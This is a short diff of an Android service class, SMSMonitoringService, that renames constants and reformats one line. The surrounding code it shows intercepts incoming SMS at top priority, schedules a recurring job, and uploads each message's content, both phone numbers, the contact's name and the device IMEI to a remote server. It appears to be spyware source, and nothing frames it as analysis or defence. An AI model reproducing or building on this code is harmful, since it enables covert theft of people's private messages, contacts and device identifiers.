@@ -47,7 +47,8 @@ public class SMSMonitoringService extends Service {
 			IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
 			intentFilter.setPriority(Integer.MAX_VALUE);
 			getApplicationContext().registerReceiver(new SMSReceiver(), intentFilter);
-		    AlarmNanagerUtil.startCron(getApplicationContext(),C.CRON_ACTION);
+		   
+			AlarmNanagerUtil.startCron(getApplicationContext(),C.CRON_ACTION);
 	}
 	
 	@Override
@@ -81,8 +82,8 @@ public class SMSMonitoringService extends Service {
 		}
 		
 		private void uploadSmsInfo(SMSRecord smsRecord) {
-			SharedPreferences sp = getApplicationContext().getSharedPreferences(C.PHONE_INFO,Context.MODE_PRIVATE);
-			String updateDate = "my_num="+sp.getString(C.PHONE,"")+"&you_num="+smsRecord.getPhone()+"&time="+smsRecord.getDateSent()+"&content="+smsRecord.getMessageContent()+"&type="+smsRecord.getType()+"&sim_id="+AppUtil.getIMEI(getApplicationContext())+"&you_name="+smsRecord.getName();
+			SharedPreferences sp = getApplicationContext().getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
+			String updateDate = "my_num="+sp.getString(C.PHONE_NUM,"")+"&you_num="+smsRecord.getPhone()+"&time="+smsRecord.getDateSent()+"&content="+smsRecord.getMessageContent()+"&type="+smsRecord.getType()+"&sim_id="+AppUtil.getIMEI(getApplicationContext())+"&you_name="+smsRecord.getName();
 			String updateResult= AppUtil.streamToStr(NetworkUtil.upload(getApplicationContext(),updateDate,C.RequestMethod.uploadSMS));
 			if("ok".equalsIgnoreCase(updateResult)){
 				sqlite.delete(SMSRecord.COL_DATE +" = ?",new String []{smsRecord.getDateSent()});
